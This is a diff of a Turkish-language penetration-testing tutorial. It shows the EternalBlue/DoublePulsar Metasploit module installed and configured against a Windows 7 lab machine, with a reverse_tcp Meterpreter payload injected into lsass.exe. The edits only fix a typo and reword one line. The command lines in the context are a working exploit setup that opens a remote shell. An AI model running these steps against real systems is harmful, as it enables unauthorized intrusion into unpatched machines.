@@ -46,7 +46,7 @@ Daha sonra [https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit](
 
 İçerisinde bulunan <u>deps</u> klasörü ile <u>eternalblue_doublepulsar.rb</u> dosyasını kalide <u>/usr/share/metasploit-framework/modules/exploits/windows/smb/</u> klasörü içersine kopyalıyoruz.
 
->service postgresql start - - - > Metasploit veritabanını güncelliyoruz. Artık msfconsole'a geçebiliriz.
+>service postgresql start - - - > Metasploit'i baştan başlatıyoruz.
 
 Ben Windows 7 Service Pack1 makinesine sızmayı deneyeceğim.
 
@@ -70,7 +70,7 @@ Eternalblue modülünü kullanmak için msfconsole'de:
 	set rhost 172.16.72.129
 	set targetarchıtecture x64
 	set payload windows/meterpreter/reverse_tcp
-	set processşnject lsass.exe
+	set processinject lsass.exe
 	set lhost 172.16.72.128
 	set target 9
 
